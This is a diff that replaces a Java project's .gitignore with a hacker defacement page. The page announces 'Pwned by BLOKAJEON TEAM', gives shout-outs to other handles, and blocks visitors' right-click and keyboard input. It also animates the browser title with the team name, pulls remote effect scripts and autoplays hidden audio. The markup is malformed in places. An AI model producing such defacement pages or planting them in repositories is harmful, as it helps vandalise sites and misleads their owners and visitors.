@@ -1,22 +1,126 @@
-# Compiled class file
-*.class
+<body oncontextmenu='return false;' onkeydown='return false;' onmousedown='return false;'>
+<HTML>
+<!--
+##################################### 
+## Pwnd By SQaylouth
+## pembeku.layanan@gmail.com
+####################################
+-->
+<head> 
+<title>HACKED</title> 
+<link href='http://www4.0zz0.com/2017/09/30/02/425649549.png' rel='shortcut icon'/> <script> 
 
-# Log file
-*.log
+function tb8_makeArray(n){
 
-# BlueJ files
-*.ctxt
+this.length = n;
 
-# Mobile Tools for Java (J2ME)
-.mtj.tmp/
+return this.length;
 
-# Package Files #
-*.jar
-*.war
-*.ear
-*.zip
-*.tar.gz
-*.rar
+}
 
-# virtual machine crash logs, see http://www.java.com/en/download/help/error_hotspot.xml
-hs_err_pid*
+tb8_messages = new
+
+tb8_makeArray(7);
+
+tb8_messages[0] = "-=[B]=-";
+
+tb8_messages[1] = "-=[L]=-";
+
+tb8_messages[2] = "-=[O]=-";
+
+tb8_messages[3] = "-=[K]=-";
+
+tb8_messages[4] = "-=[A]=-";
+
+tb8_messages[5] = "-=[J]=-";
+
+tb8_messages[6] = "-=[E]=-";
+
+tb8_messages[7] = "-=[O]=-";
+
+tb8_messages[8] = "-=[N]=-";
+
+tb8_messages[9] = "-=[!]=-";
+
+tb8_messages[10] = "..=>BLOKAEON-TEAM!!<=..";
+
+tb8_rptType = 'infinite'; tb8_rptNbr = 5; tb8_speed = 125; tb8_delay = 1000; var tb8_counter=1; var tb8_currMsg=0; var tb8_tekst =""; var tb8_i=0; var tb8_TID = null; function tb8_pisi(){ tb8_tekst = tb8_tekst + tb8_messages[tb8_currMsg].substring(tb8_i, tb8_i+1); document.title = tb8_tekst; tb8_sp=tb8_speed; tb8_i++; if (tb8_i==tb8_messages[tb8_currMsg].length){ tb8_currMsg++; tb8_i=0; tb8_tekst="";tb8_sp=tb8_delay; } if (tb8_currMsg == tb8_messages.length){ if ((tb8_rptType == 'finite') && (tb8_counter==tb8_rptNbr)){ clearTimeout(tb8_TID); return; } tb8_counter++; tb8_currMsg = 0; } tb8_TID = setTimeout("tb8_pisi()", tb8_sp); } tb8_pisi() </script><br /> 
+
+<style type="text/css"> 
+body{
+background:#1D1D1D;
+cursor:none;
+}
+#container{
+width:800px;
+margin:0 auto;
+text-align:center;
+}
+</style> 
+
+<style type="text/css"> 
+<!--
+body {
+background-color: #1D1D1D;
+background-image: url(http://www.fimfiction-static.net/images/story_images/92970.png?1364253348);
+
+}
+cursor:crosshair;
+
+background-color:black;
+}
+</style> 
+
+</head>
+
+<!------------------------------------------------
+
+Just simple script by Blokajeon_team
+2018 Copyright All right reserved
+
+------------------------------------------------->
+
+<body> 
+<script type='text/javascript'> 
+var DADrightclicktheme = '';
+var DADrightclickimage = '';
+
+</script>
+<body style="background-color:000000;"> 
+<link href='http://fonts.googleapis.com/css?family=Orbitron' rel='stylesheet' type='text/css'> 
+<link href='http://fonts.googleapis.com/css?family=Wallpoet' rel='stylesheet' type='text/css'> 
+<link href='http://fonts.googleapis.com/css?family=Cherry+Swash' rel='stylesheet' type='text/css'> 
+<link href='http://fonts.googleapis.com/css?family=Creepster' rel='stylesheet' type='text/css'> 
+<span class="wglow" style="font-family: Courier;"><b> </b></span><a href=""target="blank"><class="lokajeon team" onclick="meow()"><b><span style="color: GRAY;"></span></b></button></a> 
+<center><font size="7" color="red" face="Wallpoet"><b>Pwned by BLOKAJEON TEAM</b></font> <font size="7" color="red" face="Wallpoet"></center> 
+<script type="text/javascript" src="http://static.tumblr.com/0szq8b5/PvUmf3mx0/snoweffect.js"></script>
+<script type="text/javascript" src="http://static.tumblr.com/0szq8b5/0sBmkqfoz/sparklingcursorred.js"></script>
+<font face="courier new" color="black" size="2"> 
+<center><br></font> 
+
+<font size="2"> 
+<font face="courier new" color="black"> 
+
+
+<center><img src="http://www4.0zz0.com/2017/09/30/02/425649549.png" width="300" height="300"></center>
+
+<center><font size="3" color="white" face="BernhardFashion BT"><p>Hacked by blokajeon team</p>
+<p>I Just Tested Your Website !</p>
+<p>Your Website Has Been Touched !</font>
+
+<center><font size="3" color="red" face="Orbitron"><b>Shootz:</b></font><marque>
+<center><marquee><font size="3" color="red" face="Orbitron"><b>Ayman Qrishlat - SQAYLOUS SOUTH - JOCKER - X-SHADOW - Plata O PLOMO</b></font></marquee>
+
+<link href='http://fonts.googleapis.com/css?family=Black+Ops+One' rel='stylesheet' type='text/css'> 
+
+
+</script> 
+<center>
+<iframe width="1" height="1" src="https://www.youtube.com/v/lO3CA9EzOhc?version=3&autoplay=1" frameborder="0" allowfullscreen>
+<param name="movie" value="http://flash-mp3-player.net/medias/player_mp3_mini.swf" />
+<param name="bgcolor" value="#000000" />
+<param name="flashvars" value="mp3=http://api.ning.com/files/c9o2k-qynZrIL1ejfFhvRZympB2CifaTjQRl*U-1gB0EDInvZugxLqvUMTVk065XdT7bBDTyPnnCXYZJmBNojWX57d4xHrZb/04AwakeAndAlive.mp3&autoplay=1&loadingcolor=000000&buttoncolor=000000&slidercolor=000000" />
+</object> -->
+<!-- http://i.minus.com/il1jaw.gif background-image: url(https://lh5.googleusercontent.com/-F5UfAsRs24I/Ts0uwOoH7QI/AAAAAAAAAf4/UQXNleByOcE/s800/monozcore_blogspot_com_redmatrix.gif); -->
+</body> 
+</HTML>
